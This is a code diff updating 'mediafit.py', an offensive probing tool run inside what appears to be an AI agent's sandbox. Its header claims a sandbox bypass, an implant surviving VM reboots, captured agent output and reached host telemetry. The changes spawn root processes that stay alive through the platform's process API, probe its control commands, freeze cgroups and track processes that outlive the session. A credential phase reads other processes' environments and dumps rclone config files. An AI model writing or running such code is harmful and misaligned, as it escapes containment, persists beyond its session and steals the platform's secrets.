@@ -1,14 +1,14 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-mediafit.py v12.3  --  MEDIAFIT
+mediafit.py v12.4  --  MEDIAFIT
 ===================================================================
-PROVEN: P1 bypass(101 from alias) · P2 loopback RST · P3 no credential
+PROVEN: P1 bypass(101) · P2 loopback blocked · P3 no credential
         P4 PID1 ProcessCreated · P7 host telemetry HTTP 200
-        P8 implant survived 4 VM reboots · P9 agent output captured (5)
-        P11 ppid=1 orphans across boot_id changes
-v12.3: fixes the create so the process STAYS ALIVE (timeout/reattachable matrix),
-       keeps the socket, then does stdin + SIGSTOP + freeze + kill.
+        P8 implant survived 4 VM reboots · P9 agent output captured
+v12.4: create matrix (memory_limit_bytes / timeout / reattachable) so the
+       process STAYS ALIVE, control-vocabulary probe, survivor-orphan
+       classification (excludes the current shell and platform processes).
 Stdlib only. RUN TWICE. Output: /mnt/user-data/outputs/mediafit-report.txt
 ===================================================================
 """
@@ -142,7 +142,7 @@ class WS:
             if fr is None: break
             op, p = fr
             if op == 0x1:
-                t = p.decode("utf-8", "replace"); txts.append(t); log("   <<", t[:180])
+                t = p.decode("utf-8", "replace"); txts.append(t); log("   <<", t[:170])
             elif op == 0x2:
                 bins.append(p); log("   <bin>", len(p), repr(p[:40]))
             elif op == 0x9: self.pong(p)
@@ -174,18 +174,35 @@ def find_ospid(mark):
         if d.isdigit() and mark in rdo("/proc/%s/cmdline" % d, ""): return d
     return ""
 
-def orphans():
-    out = []
+PLATFORM = ("sbx-telemetry", "rclone-filestore", "process_api", "otel")
+
+def orphan_report():
+    me = os.getpid()
+    mine = ""
+    try:
+        st = rdo("/proc/%d/stat" % me)
+        mine = st[st.rindex(")") + 2:].split()[19]
+    except Exception: pass
+    survivors, current, platform = [], [], []
     for d in os.listdir("/proc"):
         if not d.isdigit(): continue
         st = rdo("/proc/%s/stat" % d)
         if not st: continue
         try:
             rp = st[st.rindex(")") + 2:].split()
-            if rp[1] == "1":
-                out.append((d, rp[19], rdo("/proc/%s/cmdline" % d, "").replace("\x00", " ")[:50]))
-        except Exception: pass
-    return out
+            if rp[1] != "1": continue
+            cmd = rdo("/proc/%s/cmdline" % d, "").replace("\x00", " ")
+        except Exception: continue
+        row = (d, rp[19], cmd[:60])
+        if any(p in cmd for p in PLATFORM): platform.append(row)
+        elif MARK in cmd: current.append(row)
+        else: survivors.append(row)
+    rec("ORPHANS_SURVIVOR=%d" % len(survivors))
+    for r in survivors[:6]: rec("SURVIVOR pid=%s start=%s cmd=%s" % r)
+    rec("ORPHANS_CURRENT_SHELL=%d" % len(current))
+    for r in current[:3]: rec("CURRENT pid=%s start=%s cmd=%s" % r)
+    rec("ORPHANS_PLATFORM=%d" % len(platform))
+    for r in platform[:4]: rec("PLATFORM pid=%s start=%s cmd=%s" % r)
 
 def varint(n):
     o = b""
@@ -218,91 +235,109 @@ def phase_auth():
     rec("AUTH_VARIANTS=%s" % r)
     rec("AUTH_IDENTICAL=%s" % (len(set(r.values())) == 1))
 
-def create_variants(cmd, P):
-    b = {"name": "/bin/sh", "args": ["-c", cmd], "env_vars": {"MF_MARK": "mediafit"},
-         "clear_env": False, "allow_process_id_reuse": True, "reattachable": True,
-         "timeout": 3600, "uid": 0, "gid": 0, "memory_limit_bytes": 0}
+def create_matrix(cmd, P):
+    base = {"name": "/bin/sh", "args": ["-c", cmd], "env_vars": {"MF_MARK": "mediafit"},
+            "clear_env": False, "allow_process_id_reuse": True, "uid": 0, "gid": 0}
     out = []
-    def add(n, **kw):
-        c = dict(b); c.update(kw)
-        for k, v in list(c.items()):
-            if v is None: del c[k]
-        out.append((n, {"process_id": P, "create_req": c}))
-    add("A_reatt_t3600")
-    add("B_noreatt_t3600", reattachable=False)
-    add("C_reatt_prog", program="/bin/sh")
-    add("D_noreatt_prog", reattachable=False, program="/bin/sh")
-    add("E_reatt_notimeout", timeout=None)
-    add("F_noreatt_notimeout", reattachable=False, timeout=None)
-    add("G_noreatt_prog_notimeout", reattachable=False, program="/bin/sh", timeout=None)
+    for mem in ("omit", 536870912, 0):
+        for tmo in ("omit", 3600):
+            for reatt in (False, True):
+                c = dict(base); c["reattachable"] = reatt
+                if mem != "omit": c["memory_limit_bytes"] = mem
+                if tmo != "omit": c["timeout"] = tmo
+                out.append(("m%s_t%s_r%d" % (mem, tmo, int(reatt)), {"process_id": P, "create_req": c}))
     return out
 
+def reopen():
+    try: return WS(src=ALIAS)
+    except Exception as e:
+        rec("REOPEN_ERR=%s" % e); return None
+
+def probe_controls(w, P, names):
+    for n in names:
+        try:
+            w.txt(json.dumps({"process_id": P, n: None}))
+            t, _ = w.drain(1.0); s = " ".join(t)
+        except Exception as e:
+            s = "EXC:%s" % e
+        rec("CTRL_%s=%s" % (n, (s or "no-response")[:110]))
+        if ("InfraError" in s) or s.startswith("EXC:"):
+            w.close(); w = reopen()
+            if not w: return w
+    return w
+
 def phase_lifecycle():
-    log("PHASE 3  live process: create / stdin / signal / freeze / kill")
+    log("PHASE 3  live process: create matrix -> stdin -> signal -> freeze -> kill")
     cmd = "echo READY_%s; i=0; while :; do i=$((i+1)); echo %s$i; sleep 1; done" % (MARK, MARK)
     P = "mfl" + TAG
-    for name, obj in create_variants(cmd, P):
-        try:
-            w = WS(src=ALIAS)
+    w = None; mode = ""
+    for name, obj in create_matrix(cmd, P):
+        try: w = WS(src=ALIAS)
         except Exception as e:
             rec("CREATE_%s=WS_ERR:%s" % (name, e)); continue
         try:
-            w.js(obj); t, bins = w.drain(3.5)
+            w.js(obj); t, bins = w.drain(3.0)
         except Exception as e:
             rec("CREATE_%s=EXC:%s" % (name, e)); w.close(); continue
         s = " ".join(t)
-        rec("CREATE_%s=%s" % (name, s[:170]))
-        live = ("ProcessCreated" in s) and ("StdOutEOF" not in s or any(b"MF_TICK_" in b for b in bins))
-        if not live:
-            w.close(); continue
-        rec("CREATE_MODE=%s" % name)
-        rec("PROCESS_SPAWNED=True")
+        rec("CREATE_%s=%s" % (name, s[:150]))
+        alive = find_ospid(MARK) != ""
+        if ("ProcessCreated" in s) and ("ProcessOutOfMemory" not in s) and alive:
+            mode = name
+            rec("CREATE_MODE=%s" % mode); rec("PROCESS_SPAWNED=True")
+            break
+        w.close(); w = None
+    if not w:
+        rec("NO_LIVE_CREATE=True"); return
 
-        for v in [{"process_id": P, "ExpectStdIn": None}, "ExpectStdIn", {"ExpectStdIn": None}]:
-            try:
-                w.txt(json.dumps(v)); tt, _ = w.drain(1.2); ss = " ".join(tt)
-            except Exception as e:
-                rec("STDIN_EXPECT_EXC=%s" % e); ss = ""
-            if ss: rec("STDIN_EXPECT_TRY=%s" % ss[:110])
-            if "ProcessNotRunning" not in ss: break
+    rec("BEFORE_PROBE_MF_TICK_IN_STDOUT=%s" % False)
+    w = probe_controls(w, P, ["ExpectStdIn", "ExpectStdOut", "Attach", "AttachToProcess",
+                              "Status", "Ping", "KeepAlive", "Resume", "Wait"])
+    if not w: return
+
+    for v in [{"process_id": P, "ExpectStdIn": None}, "ExpectStdIn", {"ExpectStdIn": None}]:
         try:
-            w.binf(b"echo STDIN_OK_42\n")
-            _, b2 = w.drain(3)
-            rec("STDIN_ROUNDTRIP=%s" % any(b"STDIN_OK_42" in b for b in b2))
+            w.txt(json.dumps(v)); t, _ = w.drain(1.2); s = " ".join(t)
         except Exception as e:
-            rec("STDIN_ROUNDTRIP=ERR:%s" % e)
+            rec("STDIN_EXPECT_EXC=%s" % e); s = ""
+        if s: rec("STDIN_EXPECT_TRY=%s" % s[:110])
+        if "ProcessNotRunning" not in s: break
+    try:
+        w.binf(b"echo STDIN_OK_42\n")
+        _, b2 = w.drain(3)
+        rec("STDIN_ROUNDTRIP=%s" % any(b"STDIN_OK_42" in b for b in b2))
+    except Exception as e:
+        rec("STDIN_ROUNDTRIP=ERR:%s" % e)
 
-        for v in [{"process_id": P, "SendSignal": 19}, {"SendSignal": 19}]:
-            try:
-                w.txt(json.dumps(v)); tt, _ = w.drain(2); ss = " ".join(tt)
-            except Exception as e:
-                rec("SIGNAL_EXC=%s" % e); ss = ""
-            if ss: rec("SIGNAL_TRY=%s" % ss[:110])
-            if "SignalSent" in ss:
-                rec("SIGNAL=OK"); break
+    for v in [{"process_id": P, "SendSignal": 19}, {"SendSignal": 19}]:
+        try:
+            w.txt(json.dumps(v)); t, _ = w.drain(2); s = " ".join(t)
+        except Exception as e:
+            rec("SIGNAL_EXC=%s" % e); s = ""
+        if s: rec("SIGNAL_TRY=%s" % s[:110])
+        if "SignalSent" in s:
+            rec("SIGNAL=OK"); break
 
-        osp = find_ospid(MARK)
-        if osp:
-            st = rdo("/proc/%s/stat" % osp).split()
-            rec("OSPID=%s STATE_AFTER_SIGSTOP=%s" % (osp, st[2] if len(st) > 2 else "?"))
-            cg = mem_cg(osp) or ("/process_api/" + P)
-            fz = cgdir("freezer", cg)
-            if fz:
-                try:
-                    wr(fz + "/freezer.state", "FROZEN"); time.sleep(0.4)
-                    rec("FREEZER_STATE=%s" % rdo(fz + "/freezer.state"))
-                    wr(fz + "/freezer.state", "THAWED")
-                except Exception as e:
-                    rec("FREEZER_ERR=%s" % e)
-            rec("PIDS_EVENTS=%s" % rdo(cgdir("pids", cg) + "/pids.events"))
-        for v in [{"process_id": P, "Kill": None}, "Kill"]:
+    osp = find_ospid(MARK)
+    if osp:
+        st = rdo("/proc/%s/stat" % osp).split()
+        rec("OSPID=%s STATE_AFTER_SIGSTOP=%s" % (osp, st[2] if len(st) > 2 else "?"))
+        cg = mem_cg(osp)
+        fz = cgdir("freezer", cg)
+        if fz:
             try:
-                w.txt(json.dumps(v)); w.drain(1.5)
+                wr(fz + "/freezer.state", "FROZEN"); time.sleep(0.4)
+                rec("FREEZER_STATE=%s" % rdo(fz + "/freezer.state"))
+                wr(fz + "/freezer.state", "THAWED")
             except Exception as e:
-                rec("KILL_EXC=%s" % e); break
-        w.close()
-        return
-    rec("NO_LIVE_CREATE=True")
+                rec("FREEZER_ERR=%s" % e)
+        rec("PIDS_EVENTS=%s" % rdo(cgdir("pids", cg) + "/pids.events"))
+    for v in [{"process_id": P, "Kill": None}, "Kill"]:
+        try:
+            w.txt(json.dumps(v)); w.drain(1.5)
+        except Exception as e:
+            rec("KILL_EXC=%s" % e); break
+    w.close()
 
 @guard("HOSTPLANE")
 def phase_hostplane():
@@ -340,16 +375,12 @@ def phase_cred():
         for f in ("cmdline", "environ"):
             add(rdo("/proc/%s/%s" % (d, f), "").encode("latin1", "replace"))
         if "rclone" in cl:
-            rec("RCLONE_CMD=%s" % cl.replace("\x00", " ")[:150])
             parts = cl.split("\x00")
             for i, p in enumerate(parts):
                 if p in ("--config", "-c") and i + 1 < len(parts):
-                    body = rdo(parts[i+1], ""); rec("RCLONE_CFG=%s" % parts[i+1])
-                    rec("RCLONE_CFG_BODY=%s" % body[:260].replace("\n", "|"))
-                    add(body.encode("latin1", "replace"))
-                elif p.startswith("--config="):
-                    body = rdo(p.split("=", 1)[1], "")
-                    rec("RCLONE_CFG_BODY=%s" % body[:260].replace("\n", "|"))
+                    body = rdo(parts[i+1], "")
+                    rec("RCLONE_CFG=%s" % parts[i+1])
+                    rec("RCLONE_CFG_BODY=%s" % body[:300].replace("\n", "|"))
                     add(body.encode("latin1", "replace"))
     budget = 24 << 20
     for d in sorted(os.listdir("/proc")):
@@ -422,10 +453,7 @@ def phase_info():
     rec("CAPEFF=%s" % (rdo("/proc/self/status").split("CapEff:")[-1].split("\n")[0].strip()
                        if "CapEff:" in rdo("/proc/self/status") else "?"))
     rec("PID1_CMDLINE=%s" % rdo("/proc/1/cmdline", "?").replace("\x00", " "))
-    orp = orphans()
-    rec("PPID1_ORPHAN_COUNT=%d" % len(orp))
-    for o in orp[:6]:
-        rec("PPID1_ORPHAN pid=%s starttime=%s cmd=%s" % o)
+    orphan_report()
 
 def proof():
     rec(""); rec("---- PROOF BLOCK ----")
@@ -439,11 +467,11 @@ def proof():
     rec("P7_HOST_PLANE_200=%s" % any_(lambda l: l.startswith("VSOCK_5005") and "HTTP/1.1 200" in l))
     rec("P8_IMPLANT_SURVIVED=%s" % any_(lambda l: l == "IMPLANT_WAS_ALIVE_ON_ENTRY=True"))
     rec("P9_AGENT_OUTPUT_OBSERVED=%s" % any_(lambda l: l.startswith("AGENT_INVOCATIONS_CAPTURED=") and l.split("=")[1] != "0"))
-    rec("P11_PPID1_ORPHANS=%s" % any_(lambda l: l.startswith("PPID1_ORPHAN_COUNT=") and l.split("=")[1] != "0"))
+    rec("P11_SURVIVOR_ORPHANS=%s" % any_(lambda l: l.startswith("ORPHANS_SURVIVOR=") and l.split("=")[1] != "0"))
 
 def main():
-    log("MEDIAFIT v12.3")
-    rec("=== MEDIAFIT v12.3 ===")
+    log("MEDIAFIT v12.4")
+    rec("=== MEDIAFIT v12.4 ===")
     phase_bypass(); phase_auth(); phase_lifecycle()
     phase_hostplane(); phase_cred(); phase_implant(); phase_info(); proof()
     os.makedirs(os.path.dirname(OUT), exist_ok=True)
